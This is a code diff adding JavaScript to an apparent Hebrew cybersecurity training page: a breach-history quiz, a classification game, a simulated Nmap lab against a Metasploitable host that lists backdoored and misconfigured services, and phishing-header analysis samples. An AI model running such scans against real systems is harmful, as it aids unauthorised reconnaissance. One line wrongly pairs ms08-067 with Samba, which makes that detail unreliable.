@@ -545,6 +545,941 @@ body::after {
     </div>
   </div>
 </div>
-<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
+<script>
+// ── Clock ──
+setInterval(() => {
+  const el = document.getElementById('clk');
+  if (el) el.textContent = new Date().toLocaleTimeString('he-IL',{hour:'2-digit',minute:'2-digit'}) + ' 🔐';
+}, 1000);
+
+// ── Tabs ──
+function switchTab(id, el) {
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+  document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
+  const sec = document.getElementById(id);
+  if (sec) sec.classList.add('active');
+  if (el && el.classList) el.classList.add('active');
+  if (id === 'game') startGame();
+}
+
+// ── Chapters / Labs ──
+function toggleCh(id)  { document.getElementById(id).classList.toggle('open'); }
+function toggleLab(id) { document.getElementById(id).classList.toggle('open'); }
+const _lb1 = document.getElementById('lb1'); if (_lb1) _lb1.classList.add('open');
+
+// ── Answer Toggle ──
+function toggleAns(id) {
+  const box  = document.getElementById(id);
+  const btn  = box.previousElementSibling;
+  const icon = document.getElementById(id + 'i');
+  const open = box.classList.contains('show');
+  box.classList.toggle('show');
+  btn.classList.toggle('open');
+  if (icon) icon.textContent = open ? '▶' : '▼';
+  btn.childNodes[1].textContent = ' ' + (open ? 'הצג תשובות' : 'הסתר תשובות');
+}
+
+// ── Quiz ──
+const QS = [
+  {q:"איזה מרכיב ב-CIA Triad הופר בפרצת Equifax 2017?",tag:"CIA",opts:["רק Availability","רק Integrity","כל שלושת המרכיבים","אף מרכיב לא הופר"],ans:2,exp:"בפרצת Equifax הופרו כל שלושה: Confidentiality (143M רשומות נגנבו), Integrity (לא ניתן לוודא מה עוד שונה), Availability (השירות הושבת). הפרצה הייתה דרך CVE-2017-5638 ב-Apache Struts שהיה Patch זמין חודשיים קודם."},
+  {q:"באיזה סוג תקיפה השתמש ה-17 בן ה-Twitter 2020?",tag:"Social Eng",opts:["SQL Injection","Zero-Day Exploit","Vishing — התקשר לעובד והתחזה לIT","Ransomware"],ans:2,exp:"ילד בן 17 מפלורידה התקשר לעובדי Twitter, התחזה לאיש IT פנימי, ושכנע אותם למסור גישה לכלי ניהול פנימי. זוהי מתקפת Vishing (Voice Phishing). שום קוד מתוחכם — רק הנדסה חברתית."},
+  {q:"מה היה גורם הכניסה בפרצת Colonial Pipeline 2021?",tag:"Network",opts:["Zero-Day ב-Firewall","סיסמת VPN גנובה מהדארקווב ללא MFA","SQL Injection","Phishing Email לCEO"],ans:1,exp:"DarkSide נכנסו דרך חשבון VPN ישן שהסיסמה שלו נמצאה בDark Web מפרצה קודמת. החשבון לא היה מוגן ב-MFA. שני כלים פשוטים היו מונעים: MFA + Password Rotation."},
+  {q:"מה Heartbleed (CVE-2014-0160)?",tag:"Crypto",opts:["וירוס שמצפין קבצים","באג בOpenSSL שאפשר לקרוא 64KB מזיכרון השרת","SQL Injection ב-MySQL","DDoS Attack על שרתי DNS"],ans:1,exp:"Heartbleed אפשר לתוקף לשלוח Heartbeat Request מזויף שגורם לOpenSSL להחזיר 64KB מהזיכרון — כולל Private Keys, סיסמאות, ו-Session Tokens. 500,000 שרתים היו חשופים. הבאג היה בקוד 2 שנים."},
+  {q:"מה עיקרון Zero Trust?",tag:"Network",opts:["לבטוח בכל מה שבתוך הרשת הפנימית","לא לבטוח בשום Entity — תמיד לאמת, גם מבפנים","להגביל גישה רק לאינטרנט","להסיר Firewall ולסמוך על הצפנה"],ans:1,exp:"Zero Trust = Never Trust, Always Verify. גם משתמש ברשת הפנימית חייב Authentication + Authorization לכל גישה. Micro-segmentation מגבילה תנועה לרוחב. Google BeyondCorp וNIST SP 800-207 הגדירו את הארכיטקטורה."},
+  {q:"SolarWinds 2020 — איזה סוג תקיפה?",tag:"Malware",opts:["Ransomware","DDoS","Supply Chain Attack — הזרקת Backdoor לBuild Pipeline","Phishing"],ans:2,exp:"APT29 הזריקה Backdoor (SUNBURST) ישירות לתהליך ה-Build של SolarWinds Orion. 18,000 ארגונים התקינו את העדכון הנגוע. הBackdoor 'ישן' 14 יום כדי לעבור Sandbox Detection. Supply Chain Attack = המתקפה הכי מתוחכמת."},
+  {q:"מה ה-3-2-1 Backup Rule?",tag:"CIA",opts:["3 כוננים, 2 ממוקמים, 1 מוצפן","3 עותקים, 2 מדיות שונות, 1 Offsite","3 גיבויים יומיים, 2 שבועיים, 1 חודשי","3 שכבות הצפנה, 2 Keys, 1 HSM"],ans:1,exp:"3 עותקים של הנתונים, על 2 סוגי מדיות שונות (למשל HDD + Cloud), כש-1 לפחות Offsite. מגן מפני: כשל חומרה, כשל אחד המדיות, ואסון מקומי (שריפה/הצפה). בעידן Ransomware: גיבוי Offline שה-Ransomware לא מגיע אליו."},
+  {q:"Target 2013 — מה היה וקטור הכניסה?",tag:"Network",opts:["Zero-Day בPOS System","חדירה דרך ספק HVAC עם גישה לרשת","SQL Injection","Phishing לCTO"],ans:1,exp:"תוקפים נכנסו דרך ספק חיצוני לשירותי מיזוג אוויר (HVAC) שהיה לו גישה לרשת Target. זה מדגים Lateral Movement — נכנסים דרך החוליה החלשה, מתפשטים לנכסים הרגישים. Target ידעה על הפרצה מFireEye Alert — ולא פעלה."},
+  {q:"מה OWASP Top 10?",tag:"Pentest",opts:["10 כלי ה-Hacking הנפוצים","רשימת 10 הפגיעויות הנפוצות ב-Web Applications","10 כללי הסייבר של FBI","10 ה-CVEs הדחופים ביותר"],ans:1,exp:"OWASP (Open Web Application Security Project) מפרסמת רשימת 10 הפגיעויות הנפוצות ביותר בWeb. 2021 Top 3: Broken Access Control, Cryptographic Failures, Injection. כל מפתח Web חייב להכיר אותה."},
+  {q:"מה ההבדל בין IDS ל-IPS?",tag:"Network",opts:["IDS מהיר יותר, IPS יקר יותר","IDS מזהה ומתריע, IPS מזהה וחוסם אקטיבית","IDS בענן, IPS On-Premise","אין הבדל, מונחים זהים"],ans:1,exp:"IDS = Intrusion Detection System: מזהה תעבורה חשודה ושולח Alert — Passive. IPS = Intrusion Prevention System: מזהה וחוסם בזמן אמת — Inline. IPS יכול לגרום ל-False Positives שחוסמים תעבורה לגיטימית."},
+  {q:"מה Spear Phishing?",tag:"Social Eng",opts:["Phishing המוני לכל הרשימה","Phishing ממוקד לאדם ספציפי עם פרטים אישיים","Phishing בSMS","Phishing באמצעות USB"],ans:1,exp:"Spear Phishing = מייל מדויק לאדם ספציפי: 'שלום יוסי, בנוגע לפגישה שלנו ב-15 לחודש...' עם שמות עמיתים אמיתיים, פרטים מLinkеdIn. שיעור הצלחה 3× גבוה מPhishing רגיל. BEC (Business Email Compromise) = Spear Phishing לCFO לאשר העברת כסף."},
+  {q:"Capital One 2019 — מה איפשר לפרוץ?",tag:"Cloud",opts:["Weak Password","SSRF + IAM Role עם הרשאות רחבות מדי","SQL Injection","Ransomware"],ans:1,exp:"SSRF (Server-Side Request Forgery) גרם לשרת לQuery את AWS Metadata Service ולקבל Credentials של IAM Role. ה-Role הזה, בגלל Misconfiguration, היה עם הרשאות רחבות מדי ל-S3. הפתרון: IMDSv2 (מונע SSRF), Least Privilege."},
+  {q:"איזה Hash Algorithm הכי מומלץ לסיסמאות?",tag:"Crypto",opts:["MD5 עם Salt","SHA-256","bcrypt או argon2id","SHA-512"],ans:2,exp:"bcrypt ו-argon2id מותאמים לסיסמאות כי הם מכוונים להיות איטיים ויקרים חישובית. MD5 = 50 מיליארד hashes/שנייה ב-GPU. bcrypt(12) = 5,000/שנייה. ה-Salt מובנה. argon2id מנצח גם ASIC/FPGA attacks."},
+  {q:"מה MITRE ATT&CK?",tag:"SOC",opts:["כלי סריקת Vulnerabilities","Framework שממפה טקטיקות ושיטות של תוקפים אמיתיים","Certificate לאנשי אבטחה","ממשלת ארה\"ב לאבטחת מידע"],ans:1,exp:"MITRE ATT&CK = ידע מבוסס עולמי על טקטיקות, טכניקות, ונהלים (TTPs) של תוקפים אמיתיים. מחולק לTactics (מה התוקף רוצה) ו-Techniques (איך הוא עושה את זה). SOC Teams משתמשים לDetection Engineering, Threat Hunting, ו-Red Team Exercises."},
+  {q:"Heartland 2009 — מה הלקח?",tag:"Pentest",opts:["תמיד להצפין את הDB","SQL Injection ידוע, Patch ידוע, אחריות לא ברורה = פרצה","Firewall חזק מספיק","לא לאחסן נתוני כרטיסים"],ans:1,exp:"הפגיעות הייתה ידועה, ה-Patch היה זמין, ו'אף אחד לא הרגיש אחראי לתקן אותה'. 130 מיליון כרטיסים. הלקח: Vulnerability Management + ברור מי אחראי + Penetration Testing תקופתי. PCI-DSS מחייב Pentest שנתי על מערכות כרטיסי אשראי."},
+  {q:"מה Shared Responsibility Model?",tag:"Cloud",opts:["AWS אחראית על הכל","הלקוח אחראי על הכל","AWS מגינה על Infrastructure, הלקוח מגין על Data ו-Config שלו","הספק ביטוח מחלק אחריות"],ans:2,exp:"AWS/Azure/GCP אחראים על 'Security OF the Cloud': חומרה, רשת, Data Centers. הלקוח אחראי על 'Security IN the Cloud': IAM, Data Encryption, Network Config, OS Patching. Misconfigured S3 Bucket = אשמת הלקוח, לא AWS."},
+  {q:"מהו Dwell Time?",tag:"SOC",opts:["זמן Boot של שרת","הזמן שתוקף שוהה ברשת לפני גילוי","זמן Response לIncident","TTL של DNS Record"],ans:1,exp:"Dwell Time = הזמן מרגע החדירה ועד גילוי. ממוצע עולמי: 197 יום (2023, M-Trends Report). בזמן הזה התוקף: מסייר, מעלה הרשאות, מציב Backdoors, גונב נתונים. ירידה ל-21 יום בארגונים עם SOC מתקדם."},
+  {q:"למה אסור להשתמש ב-Root Account של AWS יומיומית?",tag:"Cloud",opts:["Root חלש מדי לפרודקשן","Root לא ניתן לBound ב-IAM Policy — גישה מלאה ללא הגבלה","Root איטי יותר","Root מוגבל ל-10 Operations ביום"],ans:1,exp:"Root Account = God Mode. לא ניתן להגביל אותו ב-IAM Policies. אם נגנב Credential = הכל חשוף. Best Practice: צור IAM User עם הרשאות הדרושות, הפעל MFA על Root, ולא תשתמש בRoot כלל. אחסן Root Credentials ב-Safe פיזי."},
+  {q:"מה Kill Chain בסייבר?",tag:"SOC",opts:["שרשרת הFail לפני קריסת שרת","7 שלבי מתקפת Cyber: Recon→Weaponize→Deliver→Exploit→Install→C2→Actions","שיטת BreachForce","Kill Switch של Malware"],ans:1,exp:"Lockheed Martin Cyber Kill Chain: Reconnaissance → Weaponization → Delivery → Exploitation → Installation → Command & Control → Actions on Objectives. כל שלב הוא הזדמנות לעצור את המתקפה. MITRE ATT&CK מפרט כל שלב לטכניקות ספציפיות."},
+  {q:"GDPR — מה מחייב במקרה של Data Breach?",tag:"Cloud",opts:["דיווח תוך 30 יום לכל המשתמשים","דיווח לרשות הגנת הפרטיות תוך 72 שעות אם יש סיכון לאנשים","דיווח רק אם נגנבו מעל 1000 רשומות","אין חובת דיווח אם הנתונים מוצפנים"],ans:1,exp:"GDPR Article 33: Data Breach שמהווה סיכון לזכויות אנשים → דיווח לDPA (Data Protection Authority) תוך 72 שעות. Article 34: Breach שמהווה סיכון גבוה → גם חובה להודיע לנפגעים. קנס עד €20M או 4% מהמחזור."}
+];
+
+let qAns = 0, qScore = 0;
+
+function buildQuiz() {
+  const list = document.getElementById('qList');
+  list.innerHTML = '';
+  qAns = 0; qScore = 0;
+  document.getElementById('scoreBox').classList.remove('show');
+  updateProg();
+  QS.forEach((q, i) => {
+    const c = document.createElement('div');
+    c.className = 'q-card'; c.id = 'qc' + i;
+    c.innerHTML = `<div class="q-top"><span class="q-idx">${String(i+1).padStart(2,'0')}/20</span><span class="q-tag">${q.tag}</span></div>
+      <div class="q-text">${q.q}</div>
+      <div class="q-opts">${q.opts.map((o,j) => `<div class="q-opt" onclick="pick(${i},${j})" id="o_${i}_${j}">${o}</div>`).join('')}</div>
+      <div class="q-exp" id="exp_${i}">${q.exp}</div>`;
+    list.appendChild(c);
+  });
+}
+
+function pick(qi, oi) {
+  const q = QS[qi];
+  document.querySelectorAll(`[id^="o_${qi}_"]`).forEach(el => el.classList.add('locked'));
+  if (oi === q.ans) {
+    document.getElementById(`o_${qi}_${oi}`).classList.add('hit');
+    document.getElementById('qc' + qi).classList.add('c-ok');
+    qScore++;
+  } else {
+    document.getElementById(`o_${qi}_${oi}`).classList.add('miss');
+    document.getElementById(`o_${qi}_${q.ans}`).classList.add('hit');
+    document.getElementById('qc' + qi).classList.add('c-fail');
+  }
+  document.getElementById('exp_' + qi).classList.add('show');
+  qAns++; updateProg();
+  if (qAns === QS.length) setTimeout(showScore, 500);
+}
+
+function updateProg() {
+  document.getElementById('qp').style.width = (qAns / QS.length * 100) + '%';
+  document.getElementById('qpl').textContent = `${qAns} / ${QS.length} נענו`;
+}
+
+function showScore() {
+  const pct = Math.round(qScore / QS.length * 100);
+  document.getElementById('scoreBox').classList.add('show');
+  document.getElementById('scoreBig').innerHTML = `${qScore}<span class="frac">/20</span>`;
+  document.getElementById('scorePct').textContent = pct + '%';
+  let msg, sub;
+  if (pct >= 90) { msg = 'Security Expert! 🛡️'; sub = 'CISSP ready. Threat actors fear you.'; }
+  else if (pct >= 75) { msg = 'Senior Analyst — עוד קצת'; sub = 'חזור על Crypto ו-Cloud Security'; }
+  else if (pct >= 55) { msg = 'Junior SOC — בדרך הנכונה'; sub = 'תרגל את המעבדות ונסה שוב'; }
+  else { msg = 'Breach Detected ❌'; sub = 'חזור לפרקים — האויב לא ישן'; }
+  document.getElementById('scoreMsg').textContent = msg;
+  document.getElementById('scoreSub').textContent = sub;
+  document.getElementById('scoreBox').scrollIntoView({ behavior: 'smooth' });
+}
+
+function restartQuiz() {
+  buildQuiz();
+  window.scrollTo({ top: document.getElementById('quiz').offsetTop - 80, behavior: 'smooth' });
+}
+
+buildQuiz();
+
+// ── Game ──
+const CATS = [
+  { id: 'cia',     label: 'CIA Triad',    cls: 'go-cia' },
+  { id: 'social',  label: 'Social Eng',   cls: 'go-threat' },
+  { id: 'crypto',  label: 'Crypto',       cls: 'go-crypto' },
+  { id: 'network', label: 'Network',      cls: 'go-network' },
+  { id: 'malware', label: 'Malware',      cls: 'go-malware' },
+  { id: 'pentest', label: 'Pentest',      cls: 'go-pentest' },
+  { id: 'soc',     label: 'SOC/IR',       cls: 'go-soc' },
+  { id: 'cloud',   label: 'Cloud Sec',    cls: 'go-cloud' },
+];
+
+const GQS = [
+  { desc: 'האם הנתונים נגישים רק למי שמורשה?', hint: 'אחד מ-3 עמודי הבסיס', ans: 'cia' },
+  { desc: 'מייל מCEO מבקש להעביר כסף דחוף', hint: 'Business Email Compromise', ans: 'social' },
+  { desc: 'AES-256 מצפין קובץ עם מפתח סימטרי', hint: 'הצפנה סימטרית', ans: 'crypto' },
+  { desc: 'Nmap סורק פורטים פתוחים ברשת', hint: 'Network Reconnaissance', ans: 'pentest' },
+  { desc: 'WannaCry מצפין קבצים ודורש Bitcoin', hint: 'קוד זדוני שמצפין', ans: 'malware' },
+  { desc: 'Firewall חוסם תעבורה לפי Rules', hint: 'הגנת רשת', ans: 'network' },
+  { desc: 'Alert ב-SIEM על Login מIP חריג', hint: 'Security Operations Center', ans: 'soc' },
+  { desc: 'S3 Bucket פתוח לPublic בטעות', hint: 'Cloud Misconfiguration', ans: 'cloud' },
+  { desc: 'bcrypt(12) לאחסון סיסמאות', hint: 'Slow Hashing Algorithm', ans: 'crypto' },
+  { desc: 'ילד בן 17 מתקשר לעובד ומתחזה לIT', hint: 'Voice Phishing', ans: 'social' },
+  { desc: 'נגיף שמסתתר בKernel ומסתיר את עצמו', hint: 'Rootkit', ans: 'malware' },
+  { desc: 'SQL Injection חושף כל רשומות הDB', hint: 'OWASP Top 10', ans: 'pentest' },
+  { desc: 'Dwell Time ממוצע: 197 יום לפני גילוי', hint: 'כמה זמן התוקף שם לפני שמגלים', ans: 'soc' },
+  { desc: 'VPN מצפין תעבורה ברשת ציבורית', hint: 'Network Security Tool', ans: 'network' },
+  { desc: 'AWS מגינה על Data Center, לקוח מגין על Data', hint: 'Shared Responsibility', ans: 'cloud' },
+  { desc: 'Digital Signature מאמת שהמייל לא שונה', hint: 'Public Key Cryptography', ans: 'crypto' },
+  { desc: 'Wireshark לוכד Credentials בHTTP Cleartext', hint: 'Network Analysis Tool', ans: 'pentest' },
+  { desc: 'Kill Chain: Recon→Weaponize→Deliver→Exploit', hint: 'Attack Lifecycle Framework', ans: 'soc' },
+  { desc: 'Zero-Day Exploit — פגיעות לא ידועה ליצרן', hint: 'Advanced Threat', ans: 'malware' },
+  { desc: 'GDPR: דיווח על פרצה תוך 72 שעות', hint: 'Data Protection Regulation', ans: 'cloud' },
+];
+
+let gScore = 0, gLives = 3, gLevel = 1, gAsked = [];
+
+function startGame() {
+  gScore = 0; gLives = 3; gLevel = 1; gAsked = [];
+  document.getElementById('gameEnd').classList.remove('show');
+  document.getElementById('gameBody').style.display = 'block';
+  updateGUI(); nextQ();
+}
+
+function updateGUI() {
+  document.getElementById('gScore').textContent = gScore;
+  document.getElementById('gLives').textContent = '❤️'.repeat(gLives) + '🖤'.repeat(3 - gLives);
+  document.getElementById('gLevel').textContent = gLevel;
+}
+
+function getCats() {
+  const count = gLevel <= 2 ? 4 : gLevel <= 4 ? 6 : 8;
+  return CATS.slice(0, count);
+}
+
+function nextQ() {
+  const rem = GQS.filter((_, i) => !gAsked.includes(i));
+  if (!rem.length || gLives <= 0) { endGame(); return; }
+  const idx = GQS.indexOf(rem[Math.floor(Math.random() * rem.length)]);
+  gAsked.push(idx);
+  const q = GQS[idx]; window._cq = q;
+  document.getElementById('gQ').textContent = q.desc;
+  document.getElementById('gH').textContent = '💭 ' + q.hint;
+  document.getElementById('gFb').textContent = '';
+  document.getElementById('gFb').className = 'game-feedback';
+  const cats = getCats();
+  document.getElementById('gOpts').innerHTML = cats.map(c =>
+    `<div class="g-opt ${c.cls}" onclick="gAns('${c.id}',this)">${c.label}<small>${
+      c.id==='cia'?'C·I·A':c.id==='social'?'Humans':c.id==='crypto'?'Encrypt':
+      c.id==='network'?'Firewall':c.id==='malware'?'Virus':c.id==='pentest'?'Attack':
+      c.id==='soc'?'Defend':'AWS/GCP'
+    }</small></div>`
+  ).join('');
+  document.getElementById('gProg').style.width = (gAsked.length / GQS.length * 100) + '%';
+  gLevel = Math.min(5, Math.floor(gScore / 4) + 1);
+  updateGUI();
+}
+
+function gAns(cat, el) {
+  const q = window._cq;
+  document.querySelectorAll('.g-opt').forEach(o => o.classList.add('locked'));
+  const fb = document.getElementById('gFb');
+  if (cat === q.ans) {
+    el.classList.add('correct');
+    gScore += gLevel;
+    fb.textContent = '✅ נכון! +' + gLevel + 'pts';
+    fb.className = 'game-feedback fb-ok';
+    updateGUI();
+    setTimeout(nextQ, 900);
+  } else {
+    el.classList.add('wrong');
+    gLives--;
+    const correct = [...document.querySelectorAll('.g-opt')].find(o =>
+      o.getAttribute('onclick') && o.getAttribute('onclick').includes("'" + q.ans + "'")
+    );
+    if (correct) correct.classList.add('correct');
+    fb.textContent = '❌ התשובה: ' + (CATS.find(c => c.id === q.ans)?.label || q.ans);
+    fb.className = 'game-feedback fb-err';
+    updateGUI();
+    if (gLives <= 0) { setTimeout(endGame, 1200); return; }
+    setTimeout(nextQ, 1400);
+  }
+}
+
+function endGame() {
+  document.getElementById('gameBody').style.display = 'none';
+  document.getElementById('gameEnd').classList.add('show');
+  let emoji, title, msg;
+  if (gScore >= 55)      { emoji = '🏆'; title = 'Cyber Expert!'; msg = 'Threat Detected → Threat Neutralized. אתה מוכן לSOC.'; }
+  else if (gScore >= 32) { emoji = '🛡️'; title = 'Security Analyst'; msg = 'טוב מאוד. עוד תרגול בCloud Security.'; }
+  else if (gScore >= 18) { emoji = '🔍'; title = 'Junior Analyst'; msg = 'בסיס קיים. חזור לפרקים ונסה שוב.'; }
+  else                   { emoji = '📖'; title = 'Breach Detected'; msg = 'Attacker 1 — Defender 0. חזור לפרקים.'; }
+  document.getElementById('geEmoji').textContent = emoji;
+  document.getElementById('geTitle').textContent = title;
+  document.getElementById('geScore').textContent = 'score: ' + gScore + ' | lives: ' + gLives;
+  document.getElementById('geMsg').textContent = msg;
+}
+
+startGame();
+
+
+// ══════════ CYBERSECURITY EMULATORS ══════════
+
+function cyC(id) { const el=document.getElementById(id); if(el) el.innerHTML='<span class="em">נוקה...</span>'; }
+function cyP(id, html, append=true) {
+  const el=document.getElementById(id); if(!el) return;
+  if(!append) el.innerHTML='';
+  const d=document.createElement('div'); d.innerHTML=html; el.appendChild(d);
+  if(append && el.firstChild && el.firstChild.classList && el.firstChild.classList.contains('em')) el.firstChild.remove();
+  el.scrollTop=el.scrollHeight;
+}
+function cyDelay(ms) { return new Promise(r=>setTimeout(r,ms)); }
+
+// ── LAB 1: Nmap ──
+async function cyLab1() {
+  const cmd = document.getElementById('cy1cmd').value;
+  const btn = document.getElementById('cy1btn');
+  btn.textContent='⏳ Scanning...'; btn.classList.add('running'); btn.disabled=true;
+  cyC('cy1out');
+
+  const cmds = {
+    sn: {
+      cmd: 'nmap -sn 192.168.1.0/24',
+      delay: 1800,
+      out: [
+        'Starting Nmap 7.94 ( https://nmap.org )',
+        '<span class="dim">Nmap scan report for 192.168.1.1 (Router)</span>',
+        '<span class="ok">Host is up</span> (0.0023s latency). MAC Address: AA:BB:CC:11:22:33 (Cisco)',
+        '<span class="dim">Nmap scan report for 192.168.1.100 (Windows PC)</span>',
+        '<span class="ok">Host is up</span> (0.0041s latency). MAC Address: 08:00:27:AB:CD:EF (VirtualBox)',
+        '<span class="warn">Nmap scan report for 192.168.1.105 (Metasploitable)</span>',
+        '<span class="ok">Host is up</span> (0.00062s latency). MAC Address: 08:00:27:12:34:56 (VirtualBox)',
+        '<span class="dim">Nmap done: 256 IP addresses (3 hosts up) scanned in 3.21 seconds</span>',
+      ]
+    },
+    sS: {
+      cmd: 'nmap -sS -p 1-1000 192.168.1.105',
+      delay: 2200,
+      out: [
+        'Starting Nmap 7.94 — SYN Stealth Scan',
+        '<span class="dim">Nmap scan report for 192.168.1.105</span>',
+        '<span class="ok">Host is up</span> (0.00045s latency)',
+        '',
+        '<span class="key">PORT     STATE  SERVICE</span>',
+        '<span class="ok">21/tcp   open   ftp</span>',
+        '<span class="ok">22/tcp   open   ssh</span>',
+        '<span class="ok">23/tcp   open   telnet</span>',
+        '<span class="warn">25/tcp   open   smtp</span>',
+        '<span class="ok">80/tcp   open   http</span>',
+        '<span class="warn">139/tcp  open   netbios-ssn</span>',
+        '<span class="warn">445/tcp  open   microsoft-ds</span>',
+        '<span class="ok">3306/tcp open   mysql</span>',
+        '<span class="warn">5432/tcp open   postgresql</span>',
+        '<span class="dim">Not shown: 991 closed tcp ports (reset)</span>',
+        '<span class="dim">Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds</span>',
+      ]
+    },
+    sV: {
+      cmd: 'nmap -sV -sC 192.168.1.105',
+      delay: 3500,
+      out: [
+        'Starting Nmap 7.94 — Service/Version Detection + Default Scripts',
+        '',
+        '<span class="key">PORT     STATE SERVICE     VERSION</span>',
+        '<span class="ok">21/tcp   open  ftp</span>         <span class="warn">vsftpd 2.3.4</span>',
+        '|_ftp-anon: <span class="warn">Anonymous FTP login allowed</span>',
+        '<span class="ok">22/tcp   open  ssh</span>         <span class="warn">OpenSSH 4.7p1</span> Debian 8ubuntu1 (protocol 2.0)',
+        '<span class="ok">23/tcp   open  telnet</span>      <span class="err">Linux telnetd ← PLAINTEXT CREDENTIALS!</span>',
+        '<span class="ok">80/tcp   open  http</span>        Apache httpd 2.2.8 ((Ubuntu) DAV/2)',
+        '|_http-title: <span class="val">Metasploitable2 - Linux</span>',
+        '<span class="warn">445/tcp  open  netbios-ssn</span> <span class="err">Samba smbd 3.X (CVE-2007-2447)</span>',
+        '<span class="ok">3306/tcp open  mysql</span>       <span class="warn">MySQL 5.0.51a</span>',
+        '| mysql-empty-password: <span class="err">root account has no password!</span>',
+        '',
+        '<span class="dim">Service detection performed. Nmap done in 12.34 seconds</span>',
+        '',
+        '<span class="warn">⚠ פגיעויות זוהו: vsftpd 2.3.4 Backdoor, Samba ms08-067, MySQL ללא סיסמה</span>',
+      ]
+    },
+    O: {
+      cmd: 'nmap -O 192.168.1.105',
+      delay: 2000,
+      out: [
+        'Starting Nmap 7.94 — OS Detection',
+        '<span class="ok">Host is up</span> (0.00044s latency)',
+        '',
+        '<span class="key">OS Detection Results:</span>',
+        'Running: <span class="val">Linux 2.6.X</span>',
+        'OS CPE: cpe:/o:linux:linux_kernel:2.6',
+        'OS details: <span class="val">Linux 2.6.9 - 2.6.33</span>',
+        'Uptime guess: 0.024 days (since today)',
+        'Network Distance: 1 hop',
+        '<span class="dim">TCP Sequence Prediction: Difficulty=205 (Good luck!)</span>',
+        '<span class="dim">IP ID Sequence Generation: All zeros</span>',
+        '',
+        '<span class="ok">✓ OS Identified: Linux 2.6.x (Ubuntu 8.04 Metasploitable)</span>',
+      ]
+    },
+    full: {
+      cmd: 'nmap -sV -sC -p- 192.168.1.105',
+      delay: 4500,
+      out: [
+        '<span class="dim">Starting Nmap 7.94 — Full port scan (65535 ports)</span>',
+        '<span class="dim">⏳ This may take a few minutes...</span>',
+        '',
+        '<span class="key">PORT      STATE SERVICE      VERSION</span>',
+        '<span class="ok">21/tcp    open  ftp</span>          vsftpd 2.3.4 <span class="err">← BACKDOOR CVE-2011-2523</span>',
+        '<span class="ok">22/tcp    open  ssh</span>          OpenSSH 4.7p1',
+        '<span class="ok">23/tcp    open  telnet</span>       Linux telnetd',
+        '<span class="ok">80/tcp    open  http</span>         Apache 2.2.8',
+        '<span class="ok">139/tcp   open  netbios-ssn</span>  Samba 3.X <span class="err">← CVE-2007-2447</span>',
+        '<span class="ok">3306/tcp  open  mysql</span>        MySQL 5.0.51a <span class="err">← no root password!</span>',
+        '<span class="ok">5900/tcp  open  vnc</span>          VNC (protocol 3.3) <span class="warn">← password: password</span>',
+        '<span class="ok">8180/tcp  open  http</span>         Apache Tomcat/Coyote 1.1 <span class="warn">← default creds</span>',
+        '',
+        '<span class="err">🎯 Attack surface: HIGH — Multiple critical vulnerabilities found</span>',
+        '<span class="dim">Nmap done: 1 IP address (1 host up) scanned in 62.18 seconds</span>',
+      ]
+    }
+  };
+
+  const scan = cmds[cmd];
+  cyP('cy1out', `<span class="dim">$ </span><span class="key">${scan.cmd}</span>`);
+  await cyDelay(scan.delay);
+  for (const line of scan.out) {
+    cyP('cy1out', line || '&nbsp;');
+    await cyDelay(60);
+  }
+  btn.textContent='▶ Run Scan'; btn.classList.remove('running'); btn.disabled=false;
+}
+
+// ── LAB 2: Phishing ──
+const CY2_SAMPLES = {
+  paypal: {
+    headers: `From: "PayPal Security" <security@paypa1.com>
+Reply-To: attacker99@gmail.com
+Return-Path: bounce@spamserver.ru
+Subject: =?UTF-8?B?6K+V6K+V6K+V?= חשבונך הושעה — פעולה נדרשת תוך 24 שעות!
+Date: ${new Date().toUTCString()}
+Received-SPF: fail (domain paypa1.com does not designate server)
+DKIM-Signature: MISSING
+DMARC: fail (p=quarantine)`,
+    flags: [
+      {type:'err', msg:'דומיין: paypa1.com (לא paypal.com!) — Typosquatting'},
+      {type:'err', msg:'Reply-To שונה מ-From — attacker99@gmail.com'},
+      {type:'err', msg:'Return-Path: שרת בRussia (spamserver.ru)'},
+      {type:'err', msg:'Received-SPF: FAIL — הדומיין לא מאשר שליחה מהIP הזה'},
+      {type:'err', msg:'DKIM: חסר לחלוטין — המייל לא חתום'},
+      {type:'err', msg:'DMARC: fail — הדומיין מצהיר על quarantine'},
+      {type:'warn', msg:'דחיפות מלאכותית: "24 שעות" — Social Engineering'},
+    ],
+    verdict: 'PHISHING', score: 0
+  },
+  ceo: {
+    headers: `From: "David Cohen - CEO" <d.cohen@company-il.com>
+Reply-To: david.cohen.ceo@gmail.com
+Subject: דחוף מאוד - העברה בנקאית נדרשת היום
+Date: ${new Date().toUTCString()}
+Received-SPF: pass
+DKIM-Signature: v=1; d=company-il.com; s=mail
+DMARC: pass`,
+    flags: [
+      {type:'ok',  msg:'SPF: pass — הדומיין מאשר שליחה'},
+      {type:'ok',  msg:'DKIM: חתום על company-il.com'},
+      {type:'err', msg:'Reply-To: gmail! — CEO אמיתי משיב מדומיין חברה'},
+      {type:'warn', msg:'Subject: "דחוף", "היום" — לחץ לפעולה מהירה'},
+      {type:'warn', msg:'BEC Pattern: התחזות לCEO לבקשת העברת כסף'},
+      {type:'warn', msg:'לא מוזכר שם המקבל, סכום, מטרה — Generic Request'},
+    ],
+    verdict: 'BEC PHISHING', score: 15
+  },
+  it: {
+    headers: `From: "IT Support" <helpdesk@company.co.il>
+Reply-To: helpdesk@company.co.il
+Subject: נדרשת איפוס סיסמה דחוף — מערכת HR
+Date: ${new Date().toUTCString()}
+Received-SPF: pass
+DKIM-Signature: v=1; d=company.co.il
+DMARC: pass (p=reject)`,
+    flags: [
+      {type:'ok',  msg:'SPF / DKIM / DMARC: עוברים'},
+      {type:'warn', msg:'IT אמיתי לא מבקש סיסמה במייל — Never!'},
+      {type:'warn', msg:'קישור לאיפוס: http://company-reset.xyz (לא הדומיין האמיתי)'},
+      {type:'err', msg:'URL Mismatch: הטקסט מציג company.co.il אבל הקישור הולך לxyz'},
+      {type:'warn', msg:'Urgency: "דחוף" — גורם ללחץ לפני בדיקה'},
+    ],
+    verdict: 'SUSPICIOUS', score: 30
+  },
+  legit: {
+    headers: `From: "Bank Hapoalim" <no-reply@bankhapoalim.co.il>
+Reply-To: no-reply@bankhapoalim.co.il
+Subject: עדכון חשוב בחשבונך
+Date: ${new Date().toUTCString()}
+Received-SPF: pass (bankhapoalim.co.il authorized)
